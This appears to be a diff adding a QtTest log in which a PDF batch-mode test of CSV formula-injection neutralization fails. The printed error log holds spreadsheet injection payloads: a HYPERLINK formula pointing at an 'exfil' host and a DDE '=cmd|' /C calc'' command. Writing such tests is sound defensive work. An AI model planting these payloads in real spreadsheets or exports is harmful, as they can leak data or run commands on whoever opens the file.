@@ -1,0 +1,11 @@
+********* Start testing of TestBatchMode *********
+Config: Using QtTest library 6.11.0, Qt 6.11.0 (x86_64-little_endian-llp64 shared (dynamic) release build; by GCC 16.1.0), windows 11
+PASS   : TestBatchMode::initTestCase()
+FAIL!  : TestBatchMode::errorLogCsvNeutralizesFormulaLeads() 'csv.contains(QStringLiteral("\"'=HYPERLINK("))' returned FALSE. (Timestamp,Severity,File,Page,Message,Technical Details?
+"2026-09-29T19:55:48","ERROR","C:/in/hostile.pdf",0,"=HYPERLINK(""http://exfil"", ""leak"")","=cmd|' /C calc'!A0"?
+"2026-09-29T19:55:48","WARNING","",,"Page count differs","-42"?
+)
+D:/pdf/pdf/tests/TestBatchMode.cpp(745) : failure location
+PASS   : TestBatchMode::cleanupTestCase()
+Totals: 2 passed, 1 failed, 0 skipped, 0 blacklisted, 323ms
+********* Finished testing of TestBatchMode *********
